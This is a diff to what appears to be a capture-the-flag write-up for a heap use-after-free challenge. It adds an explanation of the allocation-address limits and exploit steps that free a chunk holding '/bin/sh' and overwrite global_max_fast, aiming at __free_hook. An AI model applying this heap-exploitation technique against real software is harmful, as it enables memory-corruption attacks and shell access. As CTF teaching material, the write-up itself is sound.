@@ -59,6 +59,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 The vulnerability of this challenge is UAF.
 
 However, the address malloced from the following function must satisfy the following conditions.
+Therefore, the address of __free_hook cannot be allocated by malloc.
 > 0x555555757260 < malloc address < 0x600000000000
 
 ```c
@@ -89,6 +90,13 @@ pwndbg> x/30gx 0x555555756000
 ```
 
 We can write a large value to global_max_fast with the following command.
+
+> Obtain((FREE_HOOK - MAIN_ARENA)*2-0x10, "A") #0
+>
+> Obtain(0x100, "/bin/sh\x00") #1
+>
+> Lose(0)
+>
 > Change(0, p64(libc_leak) + p64(global_max_fast - 0x10))
 >
 > Obtain((FREE_HOOK - MAIN_ARENA)*2-0x10, "C") #2
